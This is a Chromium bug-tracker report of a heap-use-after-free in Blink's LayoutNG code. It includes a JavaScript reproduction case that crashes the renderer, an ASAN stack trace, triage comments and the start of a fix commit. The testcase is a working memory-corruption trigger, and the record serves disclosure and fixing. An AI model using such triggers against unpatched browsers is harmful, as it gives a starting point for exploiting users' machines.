# Security: heap-use-after-free in blink::NGBlockNode::SaveStaticOffsetForLegacy

| Field | Value |
|-------|-------|
| **Issue ID** | [40095414](https://issues.chromium.org/issues/40095414) |
| **Status** | Assigned |
| **Severity** | S4-Minimal |
| **Priority** | P1 |
| **Component** | Blink>Layout |
| **Platforms** | Linux |
| **Reporter** | cl...@gmail.com |
| **Assignee** | at...@chromium.org |
| **Created** | 2019-06-17 |
| **Bounty** | $3,000.00 |

## Description

**-------------------------**

**VULNERABILITY DETAILS**  

The following testcase crashes the latest ASAN build of content\_shell.

**VERSION**  

Chrome Version: asan-linux-release-669630  

Operating System: Linux 64bit

**REPRODUCTION CASE**

<script>
function start() {
o12=document.documentElement;
document.documentElement.style.writingMode='vertical-rl';
o54=document.createElement('dialog');
document.documentElement.innerHTML="<style>\\*{ position: fixed}{}\n\\*{ display: unset;";
try{while(window.top.document.removeChild(window.top.document.firstChild));}catch(e){}
o102=document.implementation.createHTMLDocument();
o102.body.appendChild(o54);
document.appendChild(o102.documentElement);
o121=document.createElement('dialog');
o123=document.createElement('dialog');
o123.appendChild(o12);
o54.appendChild(o123);
o54.style.all='unset';
o54.style.filter='url(';
o134=document.createElement('dialog');
o134.show();
o138=document.createElement('dialog');
o138.appendChild(o121);
o54.appendChild(o138);
o138.show();
document.documentElement.appendChild(o121);
o12.style.writingMode='horizontal-tb';
}
</script>
<body onload="start()"></body>

**FOR CRASHES, PLEASE INCLUDE THE FOLLOWING ADDITIONAL INFORMATION**  

Type of crash: tab  

Crash State:

=================================================================  

==14895==ERROR: AddressSanitizer: heap-use-after-free on address 0x612000048de8 at pc 0x55c77cb12b53 bp 0x7ffdb58ced70 sp 0x7ffdb58ced68  

READ of size 8 at 0x612000048de8 thread T0 (content\_shell)  

#0 0x55c77cb12b52 in Parent third\_party/blink/renderer/core/layout/layout\_object.h:289:41  

#1 0x55c77cb12b52 in blink::NGBlockNode::SaveStaticOffsetForLegacy(blink::LogicalOffset const&, blink::LayoutObject const\*) third\_party/blink/renderer/core/layout/ng/ng\_block\_node.cc:1155  

#2 0x55c77cb4c939 in blink::NGContainerFragmentBuilder::GetAndClearOutOfFlowDescendantCandidates(WTF::Vector<blink::NGOutOfFlowPositionedDescendant, 0u, WTF::PartitionAllocator>\*, blink::LayoutObject const\*) third\_party/blink/renderer/core/layout/ng/ng\_container\_fragment\_builder.cc:255:31  

#3 0x55c77cb80b3f in blink::NGOutOfFlowLayoutPart::LayoutDescendantCandidates(WTF::Vector<blink::NGOutOfFlowPositionedDescendant, 0u, WTF::PartitionAllocator>\*, blink::LayoutBox const\*, WTF::HashSet<blink::LayoutObject const\*, WTF::PtrHash<blink::LayoutObject const>, WTF::HashTraits<blink::LayoutObject const\*>, WTF::PartitionAllocator>\*) third\_party/blink/renderer/core/layout/ng/ng\_out\_of\_flow\_layout\_part.cc:413:25  

#4 0x55c77cb7f6a9 in blink::NGOutOfFlowLayoutPart::Run(blink::LayoutBox const\*) third\_party/blink/renderer/core/layout/ng/ng\_out\_of\_flow\_layout\_part.cc:157:3  

#5 0x55c77cb1c7a3 in blink::NGBlockLayoutAlgorithm::FinishLayout(blink::NGPreviousInflowPosition\*, blink::LogicalSize, blink::NGBoxStrut const&, blink::NGBoxStrut const&) third\_party/blink/renderer/core/layout/ng/ng\_block\_layout\_algorithm.cc:679:10  

#6 0x55c77cb1ae8f in blink::NGBlockLayoutAlgorithm::Layout(blink::NGInlineChildLayoutContext\*) third\_party/blink/renderer/core/layout/ng/ng\_block\_layout\_algorithm.cc:530:10  

#7 0x55c77cb19018 in blink::NGBlockLayoutAlgorithm::LayoutWithInlineChildLayoutContext() third\_party/blink/renderer/core/layout/ng/ng\_block\_layout\_algorithm.cc:342:10  

#8 0x55c77cb18e54 in blink::NGBlockLayoutAlgorithm::Layout() third\_party/blink/renderer/core/layout/ng/ng\_block\_layout\_algorithm.cc:335:12  

#9 0x55c77cb14560 in operator() third\_party/blink/renderer/core/layout/ng/ng\_block\_node.cc:101:50  

#10 0x55c77cb14560 in \_\_invoke<(lambda at ../../third\_party/blink/renderer/core/layout/ng/ng\_block\_node.cc:100:28) &, blink::NGLayoutAlgorithmOperations \*> buildtools/third\_party/libc++/trunk/include/type\_traits:4425  

#11 0x55c77cb14560 in \_\_call<(lambda at ../../third\_party/blink/renderer/core/layout/ng/ng\_block\_node.cc:100:28) &, blink::NGLayoutAlgorithmOperations \*> buildtools/third\_party/libc++/trunk/include/\_\_functional\_base:348  

#12 0x55c77cb14560 in operator() buildtools/third\_party/libc++/trunk/include/functional:1531  

#13 0x55c77cb14560 in void std::\_\_1::\_\_function::\_\_policy\_invoker<void (blink::NGLayoutAlgorithmOperations\*)>::\_\_call\_impl<std::\_\_1::\_\_function::\_\_alloc\_func<blink::(anonymous namespace)::LayoutWithAlgorithm(blink::NGLayoutAlgorithmParams const&)::'lambda'(blink::NGLayoutAlgorithmOperations\*), std::\_\_1::allocator<blink::(anonymous namespace)::LayoutWithAlgorithm(blink::NGLayoutAlgorithmParams const&)::'lambda'(blink::NGLayoutAlgorithmOperations\*)>, void (blink::NGLayoutAlgorithmOperations\*)> >(std::\_\_1::\_\_function::\_\_policy\_storage const\*, blink::NGLayoutAlgorithmOperations\*) buildtools/third\_party/libc++/trunk/include/functional:2014  

#14 0x55c77cb14309 in operator() buildtools/third\_party/libc++/trunk/include/functional:2127:16  

#15 0x55c77cb14309 in operator() buildtools/third\_party/libc++/trunk/include/functional:2351  

#16 0x55c77cb14309 in void blink::(anonymous namespace)::CreateAlgorithmAndRun<blink::NGBlockLayoutAlgorithm, std::\_\_1::function<void (blink::NGLayoutAlgorithmOperations\*)> >(blink::NGLayoutAlgorithmParams const&, std::\_\_1::function<void (blink::NGLayoutAlgorithmOperations\*)> const&) third\_party/blink/renderer/core/layout/ng/ng\_block\_node.cc:70  

#17 0x55c77cb1333b in blink::(anonymous namespace)::DetermineAlgorithmAndRun(blink::NGLayoutAlgorithmParams const&, std::\_\_1::function<void (blink::NGLayoutAlgorithmOperations\*)> const&) third\_party/blink/renderer/core/layout/ng/ng\_block\_node.cc:92:5  

#18 0x55c77caffac4 in LayoutWithAlgorithm third\_party/blink/renderer/core/layout/ng/ng\_block\_node.cc:99:3  

#19 0x55c77caffac4 in blink::NGBlockNode::Layout(blink::NGConstraintSpace const&, blink::NGBreakToken const\*) third\_party/blink/renderer/core/layout/ng/ng\_block\_node.cc:271  

#20 0x55c77cb860a8 in blink::NGOutOfFlowLayoutPart::GenerateFragment(blink::NGBlockNode, blink::LogicalSize const&, base::Optional[blink::LayoutUnit](javascript:void(0);) const&, blink::NGAbsolutePhysicalPosition const&) third\_party/blink/renderer/core/layout/ng/ng\_out\_of\_flow\_layout\_part.cc:672:21  

#21 0x55c77cb82f7c in blink::NGOutOfFlowLayoutPart::LayoutDescendant(blink::NGOutOfFlowPositionedDescendant const&, blink::LayoutBox const\*) third\_party/blink/renderer/core/layout/ng/ng\_out\_of\_flow\_layout\_part.cc:510:9  

#22 0x55c77cb807b3 in blink::NGOutOfFlowLayoutPart::LayoutDescendantCandidates(WTF::Vector<blink::NGOutOfFlowPositionedDescendant, 0u, WTF::PartitionAllocator>\*, blink::LayoutBox const\*, WTF::HashSet<blink::LayoutObject const\*, WTF::PtrHash<blink::LayoutObject const>, WTF::HashTraits<blink::LayoutObject const\*>, WTF::PartitionAllocator>\*) third\_party/blink/renderer/core/layout/ng/ng\_out\_of\_flow\_layout\_part.cc:400:13  

#23 0x55c77cb7f6a9 in blink::NGOutOfFlowLayoutPart::Run(blink::LayoutBox const\*) third\_party/blink/renderer/core/layout/ng/ng\_out\_of\_flow\_layout\_part.cc:157:3  

#24 0x55c77cad0a7f in blink::LayoutNGBlockFlow::UpdateOutOfFlowBlockLayout() third\_party/blink/renderer/core/layout/ng/layout\_ng\_block\_flow.cc:139:8  

#25 0x55c77cacf05e in blink::LayoutNGBlockFlow::UpdateBlockLayout(bool) third\_party/blink/renderer/core/layout/ng/layout\_ng\_block\_flow.cc:38:5  

#26 0x55c77c56472e in blink::LayoutBlock::UpdateLayout() third\_party/blink/renderer/core/layout/layout\_block.cc:429:3  

#27 0x55c77c56c430 in LayoutIfNeeded third\_party/blink/renderer/core/layout/layout\_object.h:1426:7  

#28 0x55c77c56c430 in blink::LayoutBlock::LayoutPositionedObject(blink::LayoutBox\*, bool, blink::LayoutBlock::PositionedLayoutBehavior) third\_party/blink/renderer/core/layout/layout\_block.cc:918  

#29 0x55c77c56b474 in blink::LayoutBlock::LayoutPositionedObjects(bool, blink::LayoutBlock::PositionedLayoutBehavior) third\_party/blink/renderer/core/layout/layout\_block.cc:833:5  

#30 0x55c77c58d9d6 in blink::LayoutBlockFlow::UpdateBlockLayout(bool) third\_party/blink/renderer/core/layout/layout\_block\_flow.cc:531:3  

#31 0x55c77c95164d in blink::LayoutView::UpdateBlockLayout(bool) third\_party/blink/renderer/core/layout/layout\_view.cc:301:20  

#32 0x55c77c56472e in blink::LayoutBlock::UpdateLayout() third\_party/blink/renderer/core/layout/layout\_block.cc:429:3  

#33 0x55c77c951fea in blink::LayoutView::UpdateLayout() third\_party/blink/renderer/core/layout/layout\_view.cc:339:20  

#34 0x55c77b959bb4 in blink::LocalFrameView::PerformLayout(bool) third\_party/blink/renderer/core/frame/local\_frame\_view.cc:709:24  

#35 0x55c77b955897 in blink::LocalFrameView::UpdateLayout() third\_party/blink/renderer/core/frame/local\_frame\_view.cc:847:5  

#36 0x55c77b007f9a in blink::Document::ImplicitClose() third\_party/blink/renderer/core/dom/document.cc:3483:15  

#37 0x55c77b008db2 in blink::Document::CheckCompletedInternal() third\_party/blink/renderer/core/dom/document.cc:3583:5  

#38 0x55c77b007a3d in blink::Document::CheckCompleted() third\_party/blink/renderer/core/dom/document.cc:3559:7  

#39 0x55c77ccf20f0 in blink::FrameLoader::FinishedParsing() third\_party/blink/renderer/core/loader/frame\_loader.cc:351:26  

#40 0x55c77b02ff55 in blink::Document::FinishedParsing() third\_party/blink/renderer/core/dom/document.cc:6148:21  

#41 0x55c77bfbfbd7 in end third\_party/blink/renderer/core/html/parser/html\_document\_parser.cc:905:18  

#42 0x55c77bfbfbd7 in blink::HTMLDocumentParser::AttemptToRunDeferredScriptsAndEnd() third\_party/blink/renderer/core/html/parser/html\_document\_parser.cc:920  

#43 0x55c77bfc5973 in blink::HTMLDocumentParser::ProcessTokenizedChunkFromBackgroundParser(std::\_\_1::unique\_ptr<blink::HTMLDocumentParser::TokenizedChunk, std::\_\_1::default\_delete[blink::HTMLDocumentParser::TokenizedChunk](javascript:void(0);) >) third\_party/blink/renderer/core/html/parser/html\_document\_parser.cc:551:7  

#44 0x55c77bfc1398 in blink::HTMLDocumentParser::PumpPendingSpeculations() third\_party/blink/renderer/core/html/parser/html\_document\_parser.cc:599:9  

#45 0x55c771edcea7 in Run base/callback.h:97:12  

#46 0x55c771edcea7 in blink::TaskHandle::Runner::Run(blink::TaskHandle const&) third\_party/blink/renderer/platform/scheduler/common/post\_cancellable\_task.cc:48  

#47 0x55c7748b3f72 in Run base/callback.h:97:12  

#48 0x55c7748b3f72 in base::TaskAnnotator::RunTask(char const\*, base::PendingTask\*) base/task/common/task\_annotator.cc:142  

#49 0x55c7748e9837 in base::sequence\_manager::internal::ThreadControllerWithMessagePumpImpl::DoWorkImpl(base::sequence\_manager::LazyNow\*, bool\*) base/task/sequence\_manager/thread\_controller\_with\_message\_pump\_impl.cc:368:23  

#50 0x55c7748e8de7 in base::sequence\_manager::internal::ThreadControllerWithMessagePumpImpl::DoSomeWork() base/task/sequence\_manager/thread\_controller\_with\_message\_pump\_impl.cc:219:7  

#51 0x55c774817d60 in base::MessagePumpDefault::Run(base::MessagePump::Delegate\*) base/message\_loop/message\_pump\_default.cc:39:55  

#52 0x55c7748eb86e in Run base/task/sequence\_manager/thread\_controller\_with\_message\_pump\_impl.cc:466:12  

#53 0x55c7748eb86e in non-virtual thunk to base::sequence\_manager::internal::ThreadControllerWithMessagePumpImpl::Run(bool, base::TimeDelta) base/task/sequence\_manager/thread\_controller\_with\_message\_pump\_impl.cc  

#54 0x55c774873edc in base::RunLoop::RunWithTimeout(base::TimeDelta) base/run\_loop.cc:163:14  

#55 0x55c780c3718d in content::RendererMain(content::MainFunctionParams const&) content/renderer/renderer\_main.cc:208:16  

#56 0x55c772447a2d in content::RunZygote(content::ContentMainDelegate\*) content/app/content\_main\_runner\_impl.cc:519:14  

#57 0x55c77244b0ba in content::ContentMainRunnerImpl::Run(bool) content/app/content\_main\_runner\_impl.cc:876:10  

#58 0x55c7796d86a0 in service\_manager::Main(service\_manager::MainParams const&) services/service\_manager/embedder/main.cc:422:29  

#59 0x55c76f7a0dc4 in content::ContentMain(content::ContentMainParams const&) content/app/content\_main.cc:19:10  

#60 0x55c76d1fcb0b in main content/shell/app/shell\_main.cc:43:10  

#61 0x7ff006539b96 in \_\_libc\_start\_main /build/glibc-OTsEL5/glibc-2.27/csu/../csu/libc-start.c:310

0x612000048de8 is located 40 bytes inside of 288-byte region [0x612000048dc0,0x612000048ee0)  

freed by thread T0 (content\_shell) here:  

#0 0x55c76d1d146d in \_\_interceptor\_free /b/swarming/w/ir/cache/builder/src/third\_party/llvm/compiler-rt/lib/asan/asan\_malloc\_linux.cc:123:3  

#1 0x55c77c8025eb in blink::LayoutObject::DestroyAndCleanupAnonymousWrappers() third\_party/blink/renderer/core/layout/layout\_object.cc:3268:17  

#2 0x55c77b22031c in blink::Node::DetachLayoutTree(bool) third\_party/blink/renderer/core/dom/node.cc:1447:24  

#3 0x55c77b141d7c in blink::Element::DetachLayoutTree(bool) third\_party/blink/renderer/core/dom/element.cc:2298:22  

#4 0x55c77afa4757 in blink::ContainerNode::RemoveBetween(blink::Node\*, blink::Node\*, blink::Node&) third\_party/blink/renderer/core/dom/container\_node.cc:740:15  

#5 0x55c77afa1941 in blink::ContainerNode::RemoveChild(blink::Node\*, blink::ExceptionState&) third\_party/blink/renderer/core/dom/container\_node.cc:718:7  

#6 0x55c77af9e4dc in blink::CollectChildrenAndRemoveFromOldParent(blink::Node&, blink::HeapVector<blink::Member[blink::Node](javascript:void(0);), 11u>&, blink::ExceptionState&) third\_party/blink/renderer/core/dom/container\_node.cc:151:17  

#7 0x55c77af9dc31 in blink::ContainerNode::AppendChild(blink::Node\*, blink::ExceptionState&) third\_party/blink/renderer/core/dom/container\_node.cc:845:8  

#8 0x55c77b21720a in blink::Node::appendChild(blink::Node\*, blink::ExceptionState&) third\_party/blink/renderer/core/dom/node.cc:727:23  

#9 0x55c7798d39ad in AppendChildMethodForMainWorld gen/third\_party/blink/renderer/bindings/core/v8/v8\_node.cc:669:24  

#10 0x55c7798d39ad in blink::V8Node::AppendChildMethodCallbackForMainWorld(v8::FunctionCallbackInfo[v8::Value](javascript:void(0);) const&) gen/third\_party/blink/renderer/bindings/core/v8/v8\_node.cc:1025  

#11 0x55c76ff7f288 in v8::internal::FunctionCallbackArguments::Call(v8::internal::CallHandlerInfo) v8/src/api/api-arguments-inl.h:158:3  

#12 0x55c76ff7cfd7 in v8::internal::MaybeHandle[v8::internal::Object](javascript:void(0);) v8::internal::(anonymous namespace)::HandleApiCallHelper<false>(v8::internal::Isolate\*, v8::internal::Handle[v8::internal::HeapObject](javascript:void(0);), v8::internal::Handle[v8::internal::HeapObject](javascript:void(0);), v8::internal::Handle[v8::internal::FunctionTemplateInfo](javascript:void(0);), v8::internal::Handle[v8::internal::Object](javascript:void(0);), v8::internal::BuiltinArguments) v8/src/builtins/builtins-api.cc:111:36  

#13 0x55c76ff7afc4 in v8::internal::Builtin\_Impl\_HandleApiCall(v8::internal::BuiltinArguments, v8::internal::Isolate\*) v8/src/builtins/builtins-api.cc:141:5  

#14 0x55c771c66358 in Builtins\_CEntry\_Return1\_DontSaveFPRegs\_ArgvOnStack\_BuiltinExit (/home/nils/browser/chrome/asan-linux-release-669630/content\_shell+0xb10b358)  

#15 0x55c771be4ee3 in Builtins\_InterpreterEntryTrampoline (/home/nils/browser/chrome/asan-linux-release-669630/content\_shell+0xb089ee3)  

#16 0x55c771be4ee3 in Builtins\_InterpreterEntryTrampoline (/home/nils/browser/chrome/asan-linux-release-669630/content\_shell+0xb089ee3)  

#17 0x55c771be26fc in Builtins\_JSEntryTrampoline (/home/nils/browser/chrome/asan-linux-release-669630/content\_shell+0xb0876fc)  

#18 0x55c771be24d7 in Builtins\_JSEntry (/home/nils/browser/chrome/asan-linux-release-669630/content\_shell+0xb0874d7)  

#19 0x55c7701f1c86 in Call v8/src/execution/simulator.h:138:12  

#20 0x55c7701f1c86 in v8::internal::(anonymous namespace)::Invoke(v8::internal::Isolate\*, v8::internal::(anonymous namespace)::InvokeParams const&) v8/src/execution/execution.cc:264  

#21 0x55c7701f1005 in v8::internal::Execution::Call(v8::internal::Isolate\*, v8::internal::Handle[v8::internal::Object](javascript:void(0);), v8::internal::Handle[v8::internal::Object](javascript:void(0);), int, v8::internal::Handle[v8::internal::Object](javascript:void(0);)\*) v8/src/execution/execution.cc:356:10  

#22 0x55c76fe78684 in v8::Function::Call(v8::Local[v8::Context](javascript:void(0);), v8::Local[v8::Value](javascript:void(0);), int, v8::Local[v8::Value](javascript:void(0);)\*) v8/src/api/api.cc:4782:7  

#23 0x55c7797eb470 in blink::V8ScriptRunner::CallFunction(v8::Local[v8::Function](javascript:void(0);), blink::ExecutionContext\*, v8::Local[v8::Value](javascript:void(0);), int, v8::Local[v8::Value](javascript:void(0);)\*, v8::Isolate\*) third\_party/blink/renderer/bindings/core/v8/v8\_script\_runner.cc:472:17  

#24 0x55c7798421ae in blink::V8EventHandlerNonNull::InvokeWithoutRunnabilityCheck(blink::bindings::V8ValueOrScriptWrappableAdapter, WTF::Vector<blink::ScriptValue, 0u, WTF::PartitionAllocator> const&) gen/third\_party/blink/renderer/bindings/core/v8/v8\_event\_handler\_non\_null.cc:371:8  

#25 0x55c77983d11f in blink::JSEventHandler::InvokeInternal(blink::EventTarget&, blink::Event&, v8::Local[v8::Value](javascript:void(0);)) third\_party/blink/renderer/bindings/core/v8/js\_event\_handler.cc:123:14  

#26 0x55c779840bdd in blink::JSBasedEventListener::Invoke(blink::ExecutionContext\*, blink::Event\*) third\_party/blink/renderer/bindings/core/v8/js\_based\_event\_listener.cc:152:5  

#27 0x55c77b1c54fa in blink::EventTarget::FireEventListeners(blink::Event&, blink::EventTargetData\*, blink::HeapVector<blink::RegisteredEventListener, 1u>&) third\_party/blink/renderer/core/dom/events/event\_target.cc:917:15  

#28 0x55c77b1c30f1 in blink::EventTarget::FireEventListeners(blink::Event&) third\_party/blink/renderer/core/dom/events/event\_target.cc:768:29  

#29 0x55c77b8e4025 in blink::LocalDOMWindow::DispatchEvent(blink::Event&, blink::EventTarget\*) third\_party/blink/renderer/core/frame/local\_dom\_window.cc:1408:10  

#30 0x55c77b8e35c0 in blink::LocalDOMWindow::DispatchLoadEvent() third\_party/blink/renderer/core/frame/local\_dom\_window.cc:1363:5  

#31 0x55c77b8e3174 in blink::LocalDOMWindow::DispatchWindowLoadEvent() third\_party/blink/renderer/core/frame/local\_dom\_window.cc:306:3

previously allocated by thread T0 (content\_shell) here:  

#0 0x55c76d1d16ed in \_\_interceptor\_malloc /b/swarming/w/ir/cache/builder/src/third\_party/llvm/compiler-rt/lib/asan/asan\_malloc\_linux.cc:145:3  

#1 0x55c77c7d2e19 in AllocFlags base/allocator/partition\_allocator/partition\_alloc.h:304:18  

#2 0x55c77c7d2e19 in Alloc base/allocator/partition\_allocator/partition\_alloc.h:296  

#3 0x55c77c7d2e19 in blink::LayoutObject::operator new(unsigned long) third\_party/blink/renderer/core/layout/layout\_object.cc:212  

#4 0x55c77c83af3b in CreateObject<blink::LayoutBlockFlow, blink::LayoutNGBlockFlow, blink::LayoutBlockFlow> third\_party/blink/renderer/core/layout/layout\_object\_factory.cc:60:14  

#5 0x55c77c83af3b in blink::LayoutObjectFactory::CreateBlockFlow(blink::Node&, blink::ComputedStyle const&, blink::LegacyLayout) third\_party/blink/renderer/core/layout/layout\_object\_factory.cc:74  

#6 0x55c77c7d35cc in blink::LayoutObject::CreateObject(blink::Element\*, blink::ComputedStyle const&, blink::LegacyLayout) third\_party/blink/renderer/core/layout/layout\_object.cc:260:14  

#7 0x55c77b1df2b5 in blink::LayoutTreeBuilderForElement::CreateLayoutObject() third\_party/blink/renderer/core/dom/layout\_tree\_builder.cc:115:44  

#8 0x55c77b13ebc7 in CreateLayoutObjectIfNeeded third\_party/blink/renderer/core/dom/layout\_tree\_builder.h:110:7  

#9 0x55c77b13ebc7 in blink::Element::AttachLayoutTree(blink::Node::AttachContext&) third\_party/blink/renderer/core/dom/element.cc:2221  

#10 0x55c77afa671d in blink::ContainerNode::AttachLayoutTree(blink::Node::AttachContext&) third\_party/blink/renderer/core/dom/container\_node.cc:980:12  

#11 0x55c77b13ef4e in blink::Element::AttachLayoutTree(blink::Node::AttachContext&) third\_party/blink/renderer/core/dom/element.cc:2237:20  

#12 0x55c77b148198 in blink::Element::RebuildLayoutTree(blink::WhitespaceAttacher&) third\_party/blink/renderer/core/dom/element.cc:2635:5  

#13 0x55c77afac53a in blink::ContainerNode::RebuildLayoutTreeForChild(blink::Node\*, blink::WhitespaceAttacher&) third\_party/blink/renderer/core/dom/container\_node.cc:1370:14  

#14 0x55c77afac97a in blink::ContainerNode::RebuildChildrenLayoutTrees(blink::WhitespaceAttacher&) third\_party/blink/renderer/core/dom/container\_node.cc:1395:5  

#15 0x55c77b148650 in blink::Element::RebuildLayoutTree(blink::WhitespaceAttacher&) third\_party/blink/renderer/core/dom/element.cc:2663:7  

#16 0x55c77aeec4fb in blink::StyleEngine::RebuildLayoutTree() third\_party/blink/renderer/core/css/style\_engine.cc:1759:18  

#17 0x55c77affa651 in blink::Document::UpdateStyle() third\_party/blink/renderer/core/dom/document.cc:2374:24  

#18 0x55c77afed42b in blink::Document::UpdateStyleAndLayoutTree() third\_party/blink/renderer/core/dom/document.cc:2283:3  

#19 0x55c77affd015 in blink::Document::UpdateStyleAndLayout(blink::Document::ForcedLayoutStatus) third\_party/blink/renderer/core/dom/document.cc:2538:3  

#20 0x55c77bd961dc in blink::HTMLDialogElement::show() third\_party/blink/renderer/core/html/html\_dialog\_element.cc:144:17  

#21 0x55c779eb491c in ShowMethod gen/third\_party/blink/renderer/bindings/core/v8/v8\_html\_dialog\_element.cc:138:9  

#22 0x55c779eb491c in blink::V8HTMLDialogElement::ShowMethodCallback(v8::FunctionCallbackInfo[v8::Value](javascript:void(0);) const&) gen/third\_party/blink/renderer/bindings/core/v8/v8\_html\_dialog\_element.cc:230  

#23 0x55c76ff7f288 in v8::internal::FunctionCallbackArguments::Call(v8::internal::CallHandlerInfo) v8/src/api/api-arguments-inl.h:158:3  

#24 0x55c76ff7cfd7 in v8::internal::MaybeHandle[v8::internal::Object](javascript:void(0);) v8::internal::(anonymous namespace)::HandleApiCallHelper<false>(v8::internal::Isolate\*, v8::internal::Handle[v8::internal::HeapObject](javascript:void(0);), v8::internal::Handle[v8::internal::HeapObject](javascript:void(0);), v8::internal::Handle[v8::internal::FunctionTemplateInfo](javascript:void(0);), v8::internal::Handle[v8::internal::Object](javascript:void(0);), v8::internal::BuiltinArguments) v8/src/builtins/builtins-api.cc:111:36  

#25 0x55c76ff7afc4 in v8::internal::Builtin\_Impl\_HandleApiCall(v8::internal::BuiltinArguments, v8::internal::Isolate\*) v8/src/builtins/builtins-api.cc:141:5  

#26 0x55c771c66358 in Builtins\_CEntry\_Return1\_DontSaveFPRegs\_ArgvOnStack\_BuiltinExit (/home/nils/browser/chrome/asan-linux-release-669630/content\_shell+0xb10b358)  

#27 0x55c771be4ee3 in Builtins\_InterpreterEntryTrampoline (/home/nils/browser/chrome/asan-linux-release-669630/content\_shell+0xb089ee3)  

#28 0x55c771be4ee3 in Builtins\_InterpreterEntryTrampoline (/home/nils/browser/chrome/asan-linux-release-669630/content\_shell+0xb089ee3)  

#29 0x55c771be26fc in Builtins\_JSEntryTrampoline (/home/nils/browser/chrome/asan-linux-release-669630/content\_shell+0xb0876fc)  

#30 0x55c771be24d7 in Builtins\_JSEntry (/home/nils/browser/chrome/asan-linux-release-669630/content\_shell+0xb0874d7)  

#31 0x55c7701f1c86 in Call v8/src/execution/simulator.h:138:12  

#32 0x55c7701f1c86 in v8::internal::(anonymous namespace)::Invoke(v8::internal::Isolate\*, v8::internal::(anonymous namespace)::InvokeParams const&) v8/src/execution/execution.cc:264  

#33 0x55c7701f1005 in v8::internal::Execution::Call(v8::internal::Isolate\*, v8::internal::Handle[v8::internal::Object](javascript:void(0);), v8::internal::Handle[v8::internal::Object](javascript:void(0);), int, v8::internal::Handle[v8::internal::Object](javascript:void(0);)\*) v8/src/execution/execution.cc:356:10  

#34 0x55c76fe78684 in v8::Function::Call(v8::Local[v8::Context](javascript:void(0);), v8::Local[v8::Value](javascript:void(0);), int, v8::Local[v8::Value](javascript:void(0);)\*) v8/src/api/api.cc:4782:7  

#35 0x55c7797eb470 in blink::V8ScriptRunner::CallFunction(v8::Local[v8::Function](javascript:void(0);), blink::ExecutionContext\*, v8::Local[v8::Value](javascript:void(0);), int, v8::Local[v8::Value](javascript:void(0);)\*, v8::Isolate\*) third\_party/blink/renderer/bindings/core/v8/v8\_script\_runner.cc:472:17

SUMMARY: AddressSanitizer: heap-use-after-free third\_party/blink/renderer/core/layout/layout\_object.h:289:41 in Parent  

Shadow bytes around the buggy address:  

0x0c2480001160: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  

0x0c2480001170: 00 00 00 00 00 00 00 00 00 00 00 00 fa fa fa fa  

0x0c2480001180: fa fa fa fa fa fa fa fa 00 00 00 00 00 00 00 00  

0x0c2480001190: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  

0x0c24800011a0: 00 00 00 00 00 00 00 00 00 00 00 00 fa fa fa fa  

=>0x0c24800011b0: fa fa fa fa fa fa fa fa fd fd fd fd fd[fd]fd fd  

0x0c24800011c0: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd  

0x0c24800011d0: fd fd fd fd fd fd fd fd fd fd fd fd fa fa fa fa  

0x0c24800011e0: fa fa fa fa fa fa fa fa fd fd fd fd fd fd fd fd  

0x0c24800011f0: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd  

0x0c2480001200: fd fd fd fd fd fd fd fd fd fd fd fd fa fa fa fa  

Shadow byte legend (one shadow byte represents 8 application bytes):  

Addressable: 00  

Partially addressable: 01 02 03 04 05 06 07  

Heap left redzone: fa  

Freed heap region: fd  

Stack left redzone: f1  

Stack mid redzone: f2  

Stack right redzone: f3  

Stack after return: f5  

Stack use after scope: f8  

Global redzone: f9  

Global init order: f6  

Poisoned by user: f7  

Container overflow: fc  

Array cookie: ac  

Intra object redzone: bb  

ASan internal: fe  

Left alloca redzone: ca  

Right alloca redzone: cb  

Shadow gap: cc  

==14895==ABORTING

## Timeline

### cl...@chromium.org (2019-06-17)

ClusterFuzz is analyzing your testcase. Developers can follow the progress at https://clusterfuzz.com/testcase?key=5752682626809856.

### cl...@chromium.org (2019-06-17)

[Empty comment from Monorail migration]

### me...@chromium.org (2019-06-17)

Similar stack to https://crbug.com/chromium/934485.

[Monorail components: Blink>Layout]

### at...@chromium.org (2019-06-17)

Reproduced on Linux. 

### cl...@chromium.org (2019-06-17)

Detailed report: https://clusterfuzz.com/testcase?key=5752682626809856

Job Type: linux_asan_chrome_mp
Platform Id: linux

Crash Type: Heap-use-after-free READ 8
Crash Address: 0x613000063068
Crash State:
  blink::NGBlockNode::SaveStaticOffsetForLegacy
  blink::NGOutOfFlowLayoutPart::Run
  blink::NGBlockLayoutAlgorithm::FinishLayout
  
Sanitizer: address (ASAN)

Recommended Security Severity: High

Regressed: https://clusterfuzz.com/revisions?job=linux_asan_chrome_mp&range=658676:658684

Reproducer Testcase: https://clusterfuzz.com/download?testcase_id=5752682626809856

Additional requirements: Requires HTTP

See https://github.com/google/clusterfuzz-tools for instructions to reproduce this bug locally.

A recommended severity was added to this bug. Please change the severity if it is inaccurate.

### me...@chromium.org (2019-06-18)

[Empty comment from Monorail migration]

### at...@chromium.org (2019-06-18)

Reproducible on linux. 

### sh...@chromium.org (2019-06-18)

This is a serious security regression. If you are not able to fix this quickly, please revert the change that introduced it.

If this doesn't affect a release branch, or has not been properly classified for severity, please update the Security_Impact or Security_Severity labels, and remove the ReleaseBlock label. To disable this altogether, apply ReleaseBlock-NA.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### sh...@chromium.org (2019-06-18)

Setting Pri-1 to match security severity High. If this is incorrect, please reset the priority. Sheriffbot won't make this change again.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### at...@chromium.org (2019-06-19)

Fix is on its way https://chromium-review.googlesource.com/c/chromium/src/+/1666809

### ea...@chromium.org (2019-06-19)

Amazing, thank you Aleks!

### bu...@chops-service-accounts.iam.gserviceaccount.com (2019-06-19)

The following revision refers to this bug:
  https://chromium.googlesource.com/chromium/src.git/+/cd815ad39e59ea3a66e67206f0105b1dd298da5f

commit cd815ad39e59ea3a66e67206f0105b1dd298da5f
Author: Aleks Totic <atotic@chromium.org>
Date: Wed Jun 19 20:43:31 2019

[LayoutNG] Fix DCHECK(NeedsLayout) for inline oof fixed container.

NGOutOfFlowLayoutDescendant.inline_container was not being set
correctly for an Element if:
- There is an OOF containing block between Element and
its Container(). This can only happens if Element is
position:fixed.

This caused Element not to be laid out after it got dirty (but
its containing block did not).

The fix is to set inline_container when Element's
NGOutOfFlowDesecendantCandidate gets propagated up the OOF
containing block chain.

For a while, I was afraid that this fundamentally broke
the concept of inline_container. I could not come up
